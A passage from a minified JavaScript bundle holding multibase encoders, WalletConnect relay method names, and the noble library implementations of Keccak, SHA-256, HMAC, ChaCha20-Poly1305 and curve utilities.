unction bD(t){return t.reduce((e,n)=>(e+=wD[n],e),"")}function ED(t){const e=[];for(const n of t){const r=vD[n.codePointAt(0)];if(r===void 0)throw new Error(`Non-base256emoji character: ${n}`);e.push(r)}return new Uint8Array(e)}const xD=_f({prefix:"🚀",name:"base256emoji",encode:bD,decode:ED}),SD=Object.freeze(Object.defineProperty({__proto__:null,base256emoji:xD},Symbol.toStringTag,{value:"Module"}));new TextEncoder;new TextDecoder;const lb={...F8,...q8,...V8,...K8,...J8,...oD,...cD,...fD,...mD,...SD};function FS(t,e,n,r){return{name:t,prefix:e,encoder:{name:t,prefix:e,encode:n},decoder:{decode:r}}}const cb=FS("utf8","u",t=>"u"+new TextDecoder("utf8").decode(t),t=>new TextEncoder().encode(t.substring(1))),fg=FS("ascii","a",t=>{let e="a";for(let n=0;n<t.length;n++)e+=String.fromCharCode(t[n]);return e},t=>{t=t.substring(1);const e=jS(t.length);for(let n=0;n<t.length;n++)e[n]=t.charCodeAt(n);return e}),zS={utf8:cb,"utf-8":cb,hex:lb.base16,latin1:fg,ascii:fg,binary:fg,...lb};function pr(t,e="utf8"){const n=zS[e];if(!n)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?globalThis.Buffer.from(t,"utf8"):n.decoder.decode(`${n.prefix}${t}`)}function jn(t,e="utf8"){const n=zS[e];if(!n)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?globalThis.Buffer.from(t.buffer,t.byteOffset,t.byteLength).toString("utf8"):n.encoder.encode(t).substring(1)}const _D={waku:{publish:"waku_publish",batchPublish:"waku_batchPublish",subscribe:"waku_subscribe",batchSubscribe:"waku_batchSubscribe",subscription:"waku_subscription",unsubscribe:"waku_unsubscribe",batchUnsubscribe:"waku_batchUnsubscribe",batchFetchMessages:"waku_batchFetchMessages"},irn:{publish:"irn_publish",batchPublish:"irn_batchPublish",subscribe:"irn_subscribe",batchSubscribe:"irn_batchSubscribe",subscription:"irn_subscription",unsubscribe:"irn_unsubscribe",batchUnsubscribe:"irn_batchUnsubscribe",batchFetchMessages:"irn_batchFetchMessages"},iridium:{publish:"iridium_publish",batchPublish:"iridium_batchPublish",subscribe:"iridium_subscribe",batchSubscribe:"iridium_batchSubscribe",subscription:"iridium_subscription",unsubscribe:"iridium_unsubscribe",batchUnsubscribe:"iridium_batchUnsubscribe",batchFetchMessages:"iridium_batchFetchMessages"}};function ub(t,e=[]){const n=[];return Object.keys(t).forEach(r=>{if(e.length&&!e.includes(r))return;const i=t[r];n.push(...i.accounts)}),n}function ef(t){if(!Number.isSafeInteger(t)||t<0)throw new Error("positive integer expected, got "+t)}function ID(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function Bc(t,...e){if(!ID(t))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(t.length))throw new Error("Uint8Array expected of length "+e+", got length="+t.length)}function OD(t){if(typeof t!="function"||typeof t.create!="function")throw new Error("Hash should be wrapped by utils.wrapConstructor");ef(t.outputLen),ef(t.blockLen)}function Ia(t,e=!0){if(t.destroyed)throw new Error("Hash instance has been destroyed");if(e&&t.finished)throw new Error("Hash#digest() has already been called")}function qS(t,e){Bc(t);const n=e.outputLen;if(t.length<n)throw new Error("digestInto() expects output buffer of length at least "+n)}const mh=BigInt(2**32-1),hb=BigInt(32);function $D(t,e=!1){return e?{h:Number(t&mh),l:Number(t>>hb&mh)}:{h:Number(t>>hb&mh)|0,l:Number(t&mh)|0}}function PD(t,e=!1){let n=new Uint32Array(t.length),r=new Uint32Array(t.length);for(let i=0;i<t.length;i++){const{h:o,l}=$D(t[i],e);[n[i],r[i]]=[o,l]}return[n,r]}const TD=(t,e,n)=>t<<n|e>>>32-n,AD=(t,e,n)=>e<<n|t>>>32-n,CD=(t,e,n)=>e<<n-32|t>>>64-n,RD=(t,e,n)=>t<<n-32|e>>>64-n,Vo=typeof globalThis=="object"&&"crypto"in globalThis?globalThis.crypto:void 0;function DD(t){return new Uint32Array(t.buffer,t.byteOffset,Math.floor(t.byteLength/4))}function dg(t){return new DataView(t.buffer,t.byteOffset,t.byteLength)}function Hr(t,e){return t<<32-e|t>>>e}const fb=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;function ND(t){return t<<24&4278190080|t<<8&16711680|t>>>8&65280|t>>>24&255}function db(t){for(let e=0;e<t.length;e++)t[e]=ND(t[e])}function kD(t){if(typeof t!="string")throw new Error("utf8ToBytes expected string, got "+typeof t);return new Uint8Array(new TextEncoder().encode(t))}function If(t){return typeof t=="string"&&(t=kD(t)),Bc(t),t}function BD(...t){let e=0;for(let r=0;r<t.length;r++){const i=t[r];Bc(i),e+=i.length}const n=new Uint8Array(e);for(let r=0,i=0;r<t.length;r++){const o=t[r];n.set(o,i),i+=o.length}return n}let Gm=class{clone(){return this._cloneInto()}};function HS(t){const e=r=>t().update(If(r)).digest(),n=t();return e.outputLen=n.outputLen,e.blockLen=n.blockLen,e.create=()=>t(),e}function VS(t=32){if(Vo&&typeof Vo.getRandomValues=="function")return Vo.getRandomValues(new Uint8Array(t));if(Vo&&typeof Vo.randomBytes=="function")return Vo.randomBytes(t);throw new Error("crypto.getRandomValues must be defined")}const WS=[],KS=[],GS=[],LD=BigInt(0),Gl=BigInt(1),jD=BigInt(2),UD=BigInt(7),MD=BigInt(256),FD=BigInt(113);for(let t=0,e=Gl,n=1,r=0;t<24;t++){[n,r]=[r,(2*n+3*r)%5],WS.push(2*(5*r+n)),KS.push((t+1)*(t+2)/2%64);let i=LD;for(let o=0;o<7;o++)e=(e<<Gl^(e>>UD)*FD)%MD,e&jD&&(i^=Gl<<(Gl<<BigInt(o))-Gl);GS.push(i)}const[zD,qD]=PD(GS,!0),pb=(t,e,n)=>n>32?CD(t,e,n):TD(t,e,n),gb=(t,e,n)=>n>32?RD(t,e,n):AD(t,e,n);function HD(t,e=24){const n=new Uint32Array(10);for(let r=24-e;r<24;r++){for(let l=0;l<10;l++)n[l]=t[l]^t[l+10]^t[l+20]^t[l+30]^t[l+40];for(let l=0;l<10;l+=2){const c=(l+8)%10,u=(l+2)%10,f=n[u],d=n[u+1],y=pb(f,d,1)^n[c],g=gb(f,d,1)^n[c+1];for(let E=0;E<50;E+=10)t[l+E]^=y,t[l+E+1]^=g}let i=t[2],o=t[3];for(let l=0;l<24;l++){const c=KS[l],u=pb(i,o,c),f=gb(i,o,c),d=WS[l];i=t[d],o=t[d+1],t[d]=u,t[d+1]=f}for(let l=0;l<50;l+=10){for(let c=0;c<10;c++)n[c]=t[l+c];for(let c=0;c<10;c++)t[l+c]^=~n[(c+2)%10]&n[(c+4)%10]}t[0]^=zD[r],t[1]^=qD[r]}n.fill(0)}let VD=class YS extends Gm{constructor(e,n,r,i=!1,o=24){if(super(),this.blockLen=e,this.suffix=n,this.outputLen=r,this.enableXOF=i,this.rounds=o,this.pos=0,this.posOut=0,this.finished=!1,this.destroyed=!1,ef(r),0>=this.blockLen||this.blockLen>=200)throw new Error("Sha3 supports only keccak-f1600 function");this.state=new Uint8Array(200),this.state32=DD(this.state)}keccak(){fb||db(this.state32),HD(this.state32,this.rounds),fb||db(this.state32),this.posOut=0,this.pos=0}update(e){Ia(this);const{blockLen:n,state:r}=this;e=If(e);const i=e.length;for(let o=0;o<i;){const l=Math.min(n-this.pos,i-o);for(let c=0;c<l;c++)r[this.pos++]^=e[o++];this.pos===n&&this.keccak()}return this}finish(){if(this.finished)return;this.finished=!0;const{state:e,suffix:n,pos:r,blockLen:i}=this;e[r]^=n,(n&128)!==0&&r===i-1&&this.keccak(),e[i-1]^=128,this.keccak()}writeInto(e){Ia(this,!1),Bc(e),this.finish();const n=this.state,{blockLen:r}=this;for(let i=0,o=e.length;i<o;){this.posOut>=r&&this.keccak();const l=Math.min(r-this.posOut,o-i);e.set(n.subarray(this.posOut,this.posOut+l),i),this.posOut+=l,i+=l}return e}xofInto(e){if(!this.enableXOF)throw new Error("XOF is not possible for this instance");return this.writeInto(e)}xof(e){return ef(e),this.xofInto(new Uint8Array(e))}digestInto(e){if(qS(e,this),this.finished)throw new Error("digest() was already called");return this.writeInto(e),this.destroy(),e}digest(){return this.digestInto(new Uint8Array(this.outputLen))}destroy(){this.destroyed=!0,this.state.fill(0)}_cloneInto(e){const{blockLen:n,suffix:r,outputLen:i,rounds:o,enableXOF:l}=this;return e||(e=new YS(n,r,i,l,o)),e.state32.set(this.state32),e.pos=this.pos,e.posOut=this.posOut,e.finished=this.finished,e.rounds=o,e.suffix=r,e.outputLen=i,e.enableXOF=l,e.destroyed=this.destroyed,e}};const WD=(t,e,n)=>HS(()=>new VD(e,t,n));WD(1,136,256/8);function pg(t){if(!Number.isSafeInteger(t)||t<0)throw new Error("positive integer expected, got "+t)}function JS(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function Qn(t,...e){if(!JS(t))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(t.length))throw new Error("Uint8Array expected of length "+e+", got length="+t.length)}function yb(t,e=!0){if(t.destroyed)throw new Error("Hash instance has been destroyed");if(e&&t.finished)throw new Error("Hash#digest() has already been called")}function KD(t,e){Qn(t);const n=e.outputLen;if(t.length<n)throw new Error("digestInto() expects output buffer of length at least "+n)}function mb(t){if(typeof t!="boolean")throw new Error(`boolean expected, not ${t}`)}const ms=t=>new Uint32Array(t.buffer,t.byteOffset,Math.floor(t.byteLength/4)),GD=t=>new DataView(t.buffer,t.byteOffset,t.byteLength),YD=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;if(!YD)throw new Error("Non little-endian hardware is not supported");function JD(t){if(typeof t!="string")throw new Error("string expected");return new Uint8Array(new TextEncoder().encode(t))}function _y(t){if(typeof t=="string")t=JD(t);else if(JS(t))t=Iy(t);else throw new Error("Uint8Array expected, got "+typeof t);return t}function ZD(t,e){if(e==null||typeof e!="object")throw new Error("options must be defined");return Object.assign(t,e)}function QD(t,e){if(t.length!==e.length)return!1;let n=0;for(let r=0;r<t.length;r++)n|=t[r]^e[r];return n===0}const XD=(t,e)=>{function n(r,...i){if(Qn(r),t.nonceLength!==void 0){const f=i[0];if(!f)throw new Error("nonce / iv required");t.varSizeNonce?Qn(f):Qn(f,t.nonceLength)}const o=t.tagLength;o&&i[1]!==void 0&&Qn(i[1]);const l=e(r,...i),c=(f,d)=>{if(d!==void 0){if(f!==2)throw new Error("cipher output not supported");Qn(d)}};let u=!1;return{encrypt(f,d){if(u)throw new Error("cannot encrypt() twice with same key + nonce");return u=!0,Qn(f),c(l.encrypt.length,d),l.encrypt(f,d)},decrypt(f,d){if(Qn(f),o&&f.length<o)throw new Error("invalid ciphertext length: smaller than tagLength="+o);return c(l.decrypt.length,d),l.decrypt(f,d)}}}return Object.assign(n,t),n};function wb(t,e,n=!0){if(e===void 0)return new Uint8Array(t);if(e.length!==t)throw new Error("invalid output length, expected "+t+", got: "+e.length);if(n&&!eN(e))throw new Error("invalid output, must be aligned");return e}function vb(t,e,n,r){if(typeof t.setBigUint64=="function")return t.setBigUint64(e,n,r);const i=BigInt(32),o=BigInt(4294967295),l=Number(n>>i&o),c=Number(n&o);t.setUint32(e+4,l,r),t.setUint32(e+0,c,r)}function eN(t){return t.byteOffset%4===0}function Iy(t){return Uint8Array.from(t)}function Oa(...t){for(let e=0;e<t.length;e++)t[e].fill(0)}const ZS=t=>Uint8Array.from(t.split("").map(e=>e.charCodeAt(0))),tN=ZS("expand 16-byte k"),nN=ZS("expand 32-byte k"),rN=ms(tN),iN=ms(nN);function He(t,e){return t<<e|t>>>32-e}function Oy(t){return t.byteOffset%4===0}const wh=64,sN=16,QS=2**32-1,bb=new Uint32Array;function oN(t,e,n,r,i,o,l,c){const u=i.length,f=new Uint8Array(wh),d=ms(f),y=Oy(i)&&Oy(o),g=y?ms(i):bb,E=y?ms(o):bb;for(let w=0;w<u;l++){if(t(e,n,r,d,l,c),l>=QS)throw new Error("arx: counter overflow");const b=Math.min(wh,u-w);if(y&&b===wh){const m=w/4;if(w%4!==0)throw new Error("arx: invalid block position");for(let x=0,S;x<sN;x++)S=m+x,E[S]=g[S]^d[x];w+=wh;continue}for(let m=0,x;m<b;m++)x=w+m,o[x]=i[x]^f[m];w+=b}}function aN(t,e){const{allowShortKeys:n,extendNonceFn:r,counterLength:i,counterRight:o,rounds:l}=ZD({allowShortKeys:!1,counterLength:8,counterRight:!1,rounds:20},e);if(typeof t!="function")throw new Error("core must be a function");return pg(i),pg(l),mb(o),mb(n),(c,u,f,d,y=0)=>{Qn(c),Qn(u),Qn(f);const g=f.length;if(d===void 0&&(d=new Uint8Array(g)),Qn(d),pg(y),y<0||y>=QS)throw new Error("arx: counter overflow");if(d.length<g)throw new Error(`arx: output (${d.length}) is shorter than data (${g})`);const E=[];let w=c.length,b,m;if(w===32)E.push(b=Iy(c)),m=iN;else if(w===16&&n)b=new Uint8Array(32),b.set(c),b.set(c,16),m=rN,E.push(b);else throw new Error(`arx: invalid 32-byte key, got length=${w}`);Oy(u)||E.push(u=Iy(u));const x=ms(b);if(r){if(u.length!==24)throw new Error("arx: extended nonce must be 24 bytes");r(m,x,ms(u.subarray(0,16)),x),u=u.subarray(16)}const S=16-i;if(S!==u.length)throw new Error(`arx: nonce must be ${S} or 16 bytes`);if(S!==12){const $=new Uint8Array(12);$.set(u,o?0:12-u.length),u=$,E.push(u)}const O=ms(u);return oN(t,m,x,O,f,d,y,l),Oa(...E),d}}const tn=(t,e)=>t[e++]&255|(t[e++]&255)<<8;let lN=class{constructor(e){this.blockLen=16,this.outputLen=16,this.buffer=new Uint8Array(16),this.r=new Uint16Array(10),this.h=new Uint16Array(10),this.pad=new Uint16Array(8),this.pos=0,this.finished=!1,e=_y(e),Qn(e,32);const n=tn(e,0),r=tn(e,2),i=tn(e,4),o=tn(e,6),l=tn(e,8),c=tn(e,10),u=tn(e,12),f=tn(e,14);this.r[0]=n&8191,this.r[1]=(n>>>13|r<<3)&8191,this.r[2]=(r>>>10|i<<6)&7939,this.r[3]=(i>>>7|o<<9)&8191,this.r[4]=(o>>>4|l<<12)&255,this.r[5]=l>>>1&8190,this.r[6]=(l>>>14|c<<2)&8191,this.r[7]=(c>>>11|u<<5)&8065,this.r[8]=(u>>>8|f<<8)&8191,this.r[9]=f>>>5&127;for(let d=0;d<8;d++)this.pad[d]=tn(e,16+2*d)}process(e,n,r=!1){const i=r?0:2048,{h:o,r:l}=this,c=l[0],u=l[1],f=l[2],d=l[3],y=l[4],g=l[5],E=l[6],w=l[7],b=l[8],m=l[9],x=tn(e,n+0),S=tn(e,n+2),O=tn(e,n+4),$=tn(e,n+6),R=tn(e,n+8),T=tn(e,n+10),D=tn(e,n+12),B=tn(e,n+14);let k=o[0]+(x&8191),G=o[1]+((x>>>13|S<<3)&8191),W=o[2]+((S>>>10|O<<6)&8191),J=o[3]+((O>>>7|$<<9)&8191),ne=o[4]+(($>>>4|R<<12)&8191),j=o[5]+(R>>>1&8191),A=o[6]+((R>>>14|T<<2)&8191),C=o[7]+((T>>>11|D<<5)&8191),U=o[8]+((D>>>8|B<<8)&8191),M=o[9]+(B>>>5|i),N=0,V=N+k*c+G*(5*m)+W*(5*b)+J*(5*w)+ne*(5*E);N=V>>>13,V&=8191,V+=j*(5*g)+A*(5*y)+C*(5*d)+U*(5*f)+M*(5*u),N+=V>>>13,V&=8191;let F=N+k*u+G*c+W*(5*m)+J*(5*b)+ne*(5*w);N=F>>>13,F&=8191,F+=j*(5*E)+A*(5*g)+C*(5*y)+U*(5*d)+M*(5*f),N+=F>>>13,F&=8191;let q=N+k*f+G*u+W*c+J*(5*m)+ne*(5*b);N=q>>>13,q&=8191,q+=j*(5*w)+A*(5*E)+C*(5*g)+U*(5*y)+M*(5*d),N+=q>>>13,q&=8191;let Q=N+k*d+G*f+W*u+J*c+ne*(5*m);N=Q>>>13,Q&=8191,Q+=j*(5*b)+A*(5*w)+C*(5*E)+U*(5*g)+M*(5*y),N+=Q>>>13,Q&=8191;let te=N+k*y+G*d+W*f+J*u+ne*c;N=te>>>13,te&=8191,te+=j*(5*m)+A*(5*b)+C*(5*w)+U*(5*E)+M*(5*g),N+=te>>>13,te&=8191;let se=N+k*g+G*y+W*d+J*f+ne*u;N=se>>>13,se&=8191,se+=j*c+A*(5*m)+C*(5*b)+U*(5*w)+M*(5*E),N+=se>>>13,se&=8191;let le=N+k*E+G*g+W*y+J*d+ne*f;N=le>>>13,le&=8191,le+=j*u+A*c+C*(5*m)+U*(5*b)+M*(5*w),N+=le>>>13,le&=8191;let pe=N+k*w+G*E+W*g+J*y+ne*d;N=pe>>>13,pe&=8191,pe+=j*f+A*u+C*c+U*(5*m)+M*(5*b),N+=pe>>>13,pe&=8191;let he=N+k*b+G*w+W*E+J*g+ne*y;N=he>>>13,he&=8191,he+=j*d+A*f+C*u+U*c+M*(5*m),N+=he>>>13,he&=8191;let fe=N+k*m+G*b+W*w+J*E+ne*g;N=fe>>>13,fe&=8191,fe+=j*y+A*d+C*f+U*u+M*c,N+=fe>>>13,fe&=8191,N=(N<<2)+N|0,N=N+V|0,V=N&8191,N=N>>>13,F+=N,o[0]=V,o[1]=F,o[2]=q,o[3]=Q,o[4]=te,o[5]=se,o[6]=le,o[7]=pe,o[8]=he,o[9]=fe}finalize(){const{h:e,pad:n}=this,r=new Uint16Array(10);let i=e[1]>>>13;e[1]&=8191;for(let c=2;c<10;c++)e[c]+=i,i=e[c]>>>13,e[c]&=8191;e[0]+=i*5,i=e[0]>>>13,e[0]&=8191,e[1]+=i,i=e[1]>>>13,e[1]&=8191,e[2]+=i,r[0]=e[0]+5,i=r[0]>>>13,r[0]&=8191;for(let c=1;c<10;c++)r[c]=e[c]+i,i=r[c]>>>13,r[c]&=8191;r[9]-=8192;let o=(i^1)-1;for(let c=0;c<10;c++)r[c]&=o;o=~o;for(let c=0;c<10;c++)e[c]=e[c]&o|r[c];e[0]=(e[0]|e[1]<<13)&65535,e[1]=(e[1]>>>3|e[2]<<10)&65535,e[2]=(e[2]>>>6|e[3]<<7)&65535,e[3]=(e[3]>>>9|e[4]<<4)&65535,e[4]=(e[4]>>>12|e[5]<<1|e[6]<<14)&65535,e[5]=(e[6]>>>2|e[7]<<11)&65535,e[6]=(e[7]>>>5|e[8]<<8)&65535,e[7]=(e[8]>>>8|e[9]<<5)&65535;let l=e[0]+n[0];e[0]=l&65535;for(let c=1;c<8;c++)l=(e[c]+n[c]|0)+(l>>>16)|0,e[c]=l&65535;Oa(r)}update(e){yb(this);const{buffer:n,blockLen:r}=this;e=_y(e);const i=e.length;for(let o=0;o<i;){const l=Math.min(r-this.pos,i-o);if(l===r){for(;r<=i-o;o+=r)this.process(e,o);continue}n.set(e.subarray(o,o+l),this.pos),this.pos+=l,o+=l,this.pos===r&&(this.process(n,0,!1),this.pos=0)}return this}destroy(){Oa(this.h,this.r,this.buffer,this.pad)}digestInto(e){yb(this),KD(e,this),this.finished=!0;const{buffer:n,h:r}=this;let{pos:i}=this;if(i){for(n[i++]=1;i<16;i++)n[i]=0;this.process(n,0,!0)}this.finalize();let o=0;for(let l=0;l<8;l++)e[o++]=r[l]>>>0,e[o++]=r[l]>>>8;return e}digest(){const{buffer:e,outputLen:n}=this;this.digestInto(e);const r=e.slice(0,n);return this.destroy(),r}};function cN(t){const e=(r,i)=>t(i).update(_y(r)).digest(),n=t(new Uint8Array(32));return e.outputLen=n.outputLen,e.blockLen=n.blockLen,e.create=r=>t(r),e}const uN=cN(t=>new lN(t));function hN(t,e,n,r,i,o=20){let l=t[0],c=t[1],u=t[2],f=t[3],d=e[0],y=e[1],g=e[2],E=e[3],w=e[4],b=e[5],m=e[6],x=e[7],S=i,O=n[0],$=n[1],R=n[2],T=l,D=c,B=u,k=f,G=d,W=y,J=g,ne=E,j=w,A=b,C=m,U=x,M=S,N=O,V=$,F=R;for(let Q=0;Q<o;Q+=2)T=T+G|0,M=He(M^T,16),j=j+M|0,G=He(G^j,12),T=T+G|0,M=He(M^T,8),j=j+M|0,G=He(G^j,7),D=D+W|0,N=He(N^D,16),A=A+N|0,W=He(W^A,12),D=D+W|0,N=He(N^D,8),A=A+N|0,W=He(W^A,7),B=B+J|0,V=He(V^B,16),C=C+V|0,J=He(J^C,12),B=B+J|0,V=He(V^B,8),C=C+V|0,J=He(J^C,7),k=k+ne|0,F=He(F^k,16),U=U+F|0,ne=He(ne^U,12),k=k+ne|0,F=He(F^k,8),U=U+F|0,ne=He(ne^U,7),T=T+W|0,F=He(F^T,16),C=C+F|0,W=He(W^C,12),T=T+W|0,F=He(F^T,8),C=C+F|0,W=He(W^C,7),D=D+J|0,M=He(M^D,16),U=U+M|0,J=He(J^U,12),D=D+J|0,M=He(M^D,8),U=U+M|0,J=He(J^U,7),B=B+ne|0,N=He(N^B,16),j=j+N|0,ne=He(ne^j,12),B=B+ne|0,N=He(N^B,8),j=j+N|0,ne=He(ne^j,7),k=k+G|0,V=He(V^k,16),A=A+V|0,G=He(G^A,12),k=k+G|0,V=He(V^k,8),A=A+V|0,G=He(G^A,7);let q=0;r[q++]=l+T|0,r[q++]=c+D|0,r[q++]=u+B|0,r[q++]=f+k|0,r[q++]=d+G|0,r[q++]=y+W|0,r[q++]=g+J|0,r[q++]=E+ne|0,r[q++]=w+j|0,r[q++]=b+A|0,r[q++]=m+C|0,r[q++]=x+U|0,r[q++]=S+M|0,r[q++]=O+N|0,r[q++]=$+V|0,r[q++]=R+F|0}const fN=aN(hN,{counterRight:!1,counterLength:4,allowShortKeys:!1}),dN=new Uint8Array(16),Eb=(t,e)=>{t.update(e);const n=e.length%16;n&&t.update(dN.subarray(n))},pN=new Uint8Array(32);function xb(t,e,n,r,i){const o=t(e,n,pN),l=uN.create(o);i&&Eb(l,i),Eb(l,r);const c=new Uint8Array(16),u=GD(c);vb(u,0,BigInt(i?i.length:0),!0),vb(u,8,BigInt(r.length),!0),l.update(c);const f=l.digest();return Oa(o,c),f}const gN=t=>(e,n,r)=>({encrypt(i,o){const l=i.length;o=wb(l+16,o,!1),o.set(i);const c=o.subarray(0,-16);t(e,n,c,c,1);const u=xb(t,e,n,c,r);return o.set(u,l),Oa(u),o},decrypt(i,o){o=wb(i.length-16,o,!1);const l=i.subarray(0,-16),c=i.subarray(-16),u=xb(t,e,n,l,r);if(!QD(c,u))throw new Error("invalid tag");return o.set(i.subarray(0,-16)),t(e,n,o,o,1),Oa(u),o}});XD({blockSize:64,nonceLength:12,tagLength:16},gN(fN));let XS=class extends Gm{constructor(e,n){super(),this.finished=!1,this.destroyed=!1,OD(e);const r=If(n);if(this.iHash=e.create(),typeof this.iHash.update!="function")throw new Error("Expected instance of class which extends utils.Hash");this.blockLen=this.iHash.blockLen,this.outputLen=this.iHash.outputLen;const i=this.blockLen,o=new Uint8Array(i);o.set(r.length>i?e.create().update(r).digest():r);for(let l=0;l<o.length;l++)o[l]^=54;this.iHash.update(o),this.oHash=e.create();for(let l=0;l<o.length;l++)o[l]^=106;this.oHash.update(o),o.fill(0)}update(e){return Ia(this),this.iHash.update(e),this}digestInto(e){Ia(this),Bc(e,this.outputLen),this.finished=!0,this.iHash.digestInto(e),this.oHash.update(e),this.oHash.digestInto(e),this.destroy()}digest(){const e=new Uint8Array(this.oHash.outputLen);return this.digestInto(e),e}_cloneInto(e){e||(e=Object.create(Object.getPrototypeOf(this),{}));const{oHash:n,iHash:r,finished:i,destroyed:o,blockLen:l,outputLen:c}=this;return e=e,e.finished=i,e.destroyed=o,e.blockLen=l,e.outputLen=c,e.oHash=n._cloneInto(e.oHash),e.iHash=r._cloneInto(e.iHash),e}destroy(){this.destroyed=!0,this.oHash.destroy(),this.iHash.destroy()}};const e_=(t,e,n)=>new XS(t,e).update(n).digest();e_.create=(t,e)=>new XS(t,e);function yN(t,e,n,r){if(typeof t.setBigUint64=="function")return t.setBigUint64(e,n,r);const i=BigInt(32),o=BigInt(4294967295),l=Number(n>>i&o),c=Number(n&o),u=r?4:0,f=r?0:4;t.setUint32(e+u,l,r),t.setUint32(e+f,c,r)}function mN(t,e,n){return t&e^~t&n}function wN(t,e,n){return t&e^t&n^e&n}let vN=class extends Gm{constructor(e,n,r,i){super(),this.blockLen=e,this.outputLen=n,this.padOffset=r,this.isLE=i,this.finished=!1,this.length=0,this.pos=0,this.destroyed=!1,this.buffer=new Uint8Array(e),this.view=dg(this.buffer)}update(e){Ia(this);const{view:n,buffer:r,blockLen:i}=this;e=If(e);const o=e.length;for(let l=0;l<o;){const c=Math.min(i-this.pos,o-l);if(c===i){const u=dg(e);for(;i<=o-l;l+=i)this.process(u,l);continue}r.set(e.subarray(l,l+c),this.pos),this.pos+=c,l+=c,this.pos===i&&(this.process(n,0),this.pos=0)}return this.length+=e.length,this.roundClean(),this}digestInto(e){Ia(this),qS(e,this),this.finished=!0;const{buffer:n,view:r,blockLen:i,isLE:o}=this;let{pos:l}=this;n[l++]=128,this.buffer.subarray(l).fill(0),this.padOffset>i-l&&(this.process(r,0),l=0);for(let y=l;y<i;y++)n[y]=0;yN(r,i-8,BigInt(this.length*8),o),this.process(r,0);const c=dg(e),u=this.outputLen;if(u%4)throw new Error("_sha2: outputLen should be aligned to 32bit");const f=u/4,d=this.get();if(f>d.length)throw new Error("_sha2: outputLen bigger than state");for(let y=0;y<f;y++)c.setUint32(4*y,d[y],o)}digest(){const{buffer:e,outputLen:n}=this;this.digestInto(e);const r=e.slice(0,n);return this.destroy(),r}_cloneInto(e){e||(e=new this.constructor),e.set(...this.get());const{blockLen:n,buffer:r,length:i,finished:o,destroyed:l,pos:c}=this;return e.length=i,e.pos=c,e.finished=o,e.destroyed=l,i%n&&e.buffer.set(r),e}};const bN=new Uint32Array([1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298]),os=new Uint32Array([1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225]),as=new Uint32Array(64);let EN=class extends vN{constructor(){super(64,32,8,!1),this.A=os[0]|0,this.B=os[1]|0,this.C=os[2]|0,this.D=os[3]|0,this.E=os[4]|0,this.F=os[5]|0,this.G=os[6]|0,this.H=os[7]|0}get(){const{A:e,B:n,C:r,D:i,E:o,F:l,G:c,H:u}=this;return[e,n,r,i,o,l,c,u]}set(e,n,r,i,o,l,c,u){this.A=e|0,this.B=n|0,this.C=r|0,this.D=i|0,this.E=o|0,this.F=l|0,this.G=c|0,this.H=u|0}process(e,n){for(let y=0;y<16;y++,n+=4)as[y]=e.getUint32(n,!1);for(let y=16;y<64;y++){const g=as[y-15],E=as[y-2],w=Hr(g,7)^Hr(g,18)^g>>>3,b=Hr(E,17)^Hr(E,19)^E>>>10;as[y]=b+as[y-7]+w+as[y-16]|0}let{A:r,B:i,C:o,D:l,E:c,F:u,G:f,H:d}=this;for(let y=0;y<64;y++){const g=Hr(c,6)^Hr(c,11)^Hr(c,25),E=d+g+mN(c,u,f)+bN[y]+as[y]|0,w=(Hr(r,2)^Hr(r,13)^Hr(r,22))+wN(r,i,o)|0;d=f,f=u,u=c,c=l+E|0,l=o,o=i,i=r,r=E+w|0}r=r+this.A|0,i=i+this.B|0,o=o+this.C|0,l=l+this.D|0,c=c+this.E|0,u=u+this.F|0,f=f+this.G|0,d=d+this.H|0,this.set(r,i,o,l,c,u,f,d)}roundClean(){as.fill(0)}destroy(){this.set(0,0,0,0,0,0,0,0),this.buffer.fill(0)}};const xN=HS(()=>new EN);/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const Of=BigInt(0),$f=BigInt(1),SN=BigInt(2);function ro(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function Lc(t){if(!ro(t))throw new Error("Uint8Array expected")}function $a(t,e){if(typeof e!="boolean")throw new Error(t+" boolean expected, got "+e)}const _N=Array.from({length:256},(t,e)=>e.toString(16).padStart(2,"0"));function Pa(t){Lc(t);let e="";for(let n=0;n<t.length;n++)e+=_N[t[n]];return e}function ya(t){const e=t.toString(16);return e.length&1?"0"+e:e}function Ym(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);return t===""?Of:BigInt("0x"+t)}const gi={_0:48,_9:57,A:65,F:70,a:97,f:102};function Sb(t){if(t>=gi._0&&t<=gi._9)return t-gi._0;if(t>=gi.A&&t<=gi.F)return t-(gi.A-10);if(t>=gi.a&&t<=gi.f)return t-(gi.a-10)}function Ta(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);const e=t.length,n=e/2;if(e%2)throw new Error("hex string expected, got unpadded hex of length "+e);const r=new Uint8Array(n);for(let i=0,o=0;i<n;i++,o+=2){const l=Sb(t.charCodeAt(o)),c=Sb(t.charCodeAt(o+1));if(l===void 0||c===void 0){const u=t[o]+t[o+1];throw new Error('hex string expected, got non-hex character "'+u+'" at index '+o)}r[i]=l*16+c}return r}function Xs(t){return Ym(Pa(t))}function vc(t){return Lc(t),Ym(Pa(Uint8Array.from(t).reverse()))}function Aa(t,e){return Ta(t.toString(16).padStart(e*2,"0"))}function Pf(t,e){return 